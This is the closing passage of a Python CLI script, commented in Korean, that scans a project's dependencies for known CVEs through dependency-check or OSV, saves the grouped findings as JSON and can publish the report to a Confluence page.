    else:
        payload = {
            "type": "page",
            "title": page_title,
            "ancestors": [{"id": parent_id}],
            "space": {"key": space_key},
            "body": {"storage": {"value": xhtml, "representation": "storage"}},
        }
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{base_url}/rest/api/content",
            data=data, headers=headers, method="POST",
        )

    with urllib.request.urlopen(req, timeout=30) as r:
        result = json.loads(r.read())

    page_id = result["id"]
    page_url = f"{base_url}/pages/viewpage.action?pageId={page_id}"
    print(f"  ✅ Confluence 게시 완료: {page_url}")
    return page_url


# ─────────────────────────────────────────────────────────────────
# CLI 진입점
# ─────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="SCA + CVE 관련성 분석 + PoC 생성 (P2-01/P2-02)"
    )
    parser.add_argument("source_dir", help="소스코드 디렉토리 (관련성 분석용)")
    parser.add_argument(
        "--dc-report", type=str, default=None,
        help="기존 dependency-check JSON 리포트 경로 (지정 시 dependency-check 재실행 생략)",
    )
    parser.add_argument(
        "--dep-tree", type=str, default=None,
        help="Gradle 'dependencies --configuration runtimeClasspath' 출력 파일 경로 "
             "(빌드 실패 시 dependency-check 대체 경로)",
    )
    parser.add_argument(
        "--dc-home", type=str, default=None,
        help="dependency-check 설치 디렉토리 (예: /opt/dependency-check). "
             "미지정 시 기본 경로 탐색",
    )
    parser.add_argument(
        "--jar", type=str, default=None,
        help="스캔 대상 JAR/WAR 경로 (미지정 시 source_dir 전체 스캔)",
    )
    parser.add_argument(
        "--nvd-api-key", type=str, default=None,
        help="NVD API Key (없으면 rate-limited 다운로드 사용)",
    )
    parser.add_argument(
        "--project", type=str, default=None,
        help="프로젝트 이름 (리포트 파일명에 사용, 기본: source_dir 디렉토리명)",
    )
    parser.add_argument(
        "--output", "-o", type=str, required=True,
        help="결과 JSON 출력 경로 (예: state/gws_sca.json)",
    )
    parser.add_argument(
        "--state-dir", type=str, default="state",
        help="state 디렉토리 (dependency-check 리포트 저장, 기본: state/)",
    )
    parser.add_argument(
        "--cvss", type=float, default=_DEFAULT_CVSS_THRESHOLD,
        help=f"High/Critical 기준 CVSS 점수 (기본: {_DEFAULT_CVSS_THRESHOLD})",
    )
    parser.add_argument(
        "--poc", action="store_true",
        help="취약 CVE에 대한 PoC 코드 자동 생성",
    )
    parser.add_argument(
        "--no-network", action="store_true",
        help="외부 API 호출 없이 dependency-check 결과만 사용 (CISA KEV/OSV 조회 생략)",
    )
    parser.add_argument(
        "--publish", action="store_true",
        help="분석 완료 후 Confluence에 SCA 결과 페이지 자동 게시 (.env에서 CONFLUENCE_* 자동 로드)",
    )
    parser.add_argument(
        "--page-title", type=str, default=None,
        help="Confluence 페이지 제목 (기본: '테스트NN - <project> SCA 진단 (YYYY-MM-DD)')",
    )
    parser.add_argument(
        "--parent-id", type=str, default=None,
        help="Confluence 부모 페이지 ID (미지정 시 .env CONFLUENCE_PARENT_ID 사용)",
    )
    parser.add_argument(
        "--page-id", type=str, default=None,
        help="기존 Confluence 페이지 ID (지정 시 업데이트, 미지정 시 신규 생성)",
    )

    args = parser.parse_args()

    source_dir = Path(args.source_dir)
    state_dir = Path(args.state_dir)
    output_path = Path(args.output)
    project_name = args.project or source_dir.name

    # ── 분석 경로 선택 ────────────────────────────────────────────
    if args.dep_tree:
        # OSV 기반 경로 (Gradle dep tree 파싱)
        dep_tree_path = Path(args.dep_tree)
        result = run_sca_osv(
            source_dir=source_dir,
            dep_tree_path=dep_tree_path,
            project_name=project_name,
            cvss_threshold=args.cvss,
            skip_network=args.no_network,
        )
    else:
        # dependency-check 기반 경로 (기존)
        dc_report_path = Path(args.dc_report) if args.dc_report else None
        dc_home = Path(args.dc_home) if args.dc_home else None
        jar_path = Path(args.jar) if args.jar else None
        result = run_sca(
            source_dir=source_dir,
            dc_report_path=dc_report_path,
            dc_home=dc_home,
            jar_path=jar_path,
            nvd_api_key=args.nvd_api_key,
            project_name=project_name,
            state_dir=state_dir,
            cvss_threshold=args.cvss,
            include_poc=args.poc,
            skip_network=args.no_network,
        )
        # dependency-check 경로에서도 grouped 생성
        if "findings" in result and "grouped" not in result:
            raw_for_group = []
            for f in result["findings"]:
                dep = f.get("dependency", "")
                raw_for_group.append({
                    "vuln_id": f.get("cve_id", ""),
                    "cve_id": f.get("cve_id", ""),
                    "severity": "HIGH" if f.get("cvss_score", 0) < 9 else "CRITICAL",
                    "cvss": f.get("cvss_score", 0),
                    "dep": dep,
                    "group": dep.split(":")[0] if ":" in dep else "",
                    "artifact": dep.split(":")[1] if dep.count(":") >= 1 else dep,
                    "version": f.get("version", ""),
                    "ga": ":".join(dep.split(":")[:2]) if ":" in dep else dep,
                    "summary": f.get("description", "")[:200],
                    "cwe_ids": f.get("cwes", []),
                    "kev": f.get("is_kev", False),
                    "fixed_version": f.get("fixed_in", "확인 필요") or "확인 필요",
                    "relevance_status": f.get("relevance", {}).get("judgment", "미확인"),
                    "relevance_reason": f.get("relevance", {}).get("details", ""),
                })
            result["grouped"] = _group_and_sort(raw_for_group)

    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n결과 저장: {output_path}")

    # ── Confluence 게시 ───────────────────────────────────────────
    if args.publish:
        print("\n[Confluence 게시]")
        base_url = _ENV_VARS.get("CONFLUENCE_BASE_URL", "")
        token = _ENV_VARS.get("CONFLUENCE_TOKEN", "")
        space_key = _ENV_VARS.get("CONFLUENCE_SPACE_KEY", "SECDIG")
        parent_id = args.parent_id or _ENV_VARS.get("CONFLUENCE_PARENT_ID", "")

        if not base_url or not token:
            print("  ❌ .env에 CONFLUENCE_BASE_URL / CONFLUENCE_TOKEN 미설정")
        else:
            grouped = result.get("grouped", [])
            today = datetime.now().strftime("%Y-%m-%d")
            page_title = args.page_title or f"{project_name} SCA 진단 ({today})"
            xhtml = build_sca_xhtml(
                grouped=grouped,
                project=project_name,
                source=str(source_dir),
                total_deps=result.get("total_deps", 0),
                kev_count=result.get("kev_count", 0),
                analysis_date=today,
                analysis_note=(
                    "빌드 실패 또는 JAR 미생성으로 Gradle runtimeClasspath 의존성 트리 기반 OSV 조회 수행."
                    if args.dep_tree else ""
                ),
            )
            try:
                url = publish_sca_to_confluence(
                    xhtml=xhtml,
                    page_title=page_title,
                    parent_id=parent_id,
                    space_key=space_key,
                    base_url=base_url,
                    token=token,
                    existing_page_id=args.page_id,
                )
                print(f"  URL: {url}")
            except Exception as e:
                print(f"  ❌ 게시 실패: {e}")


if __name__ == "__main__":
    main()
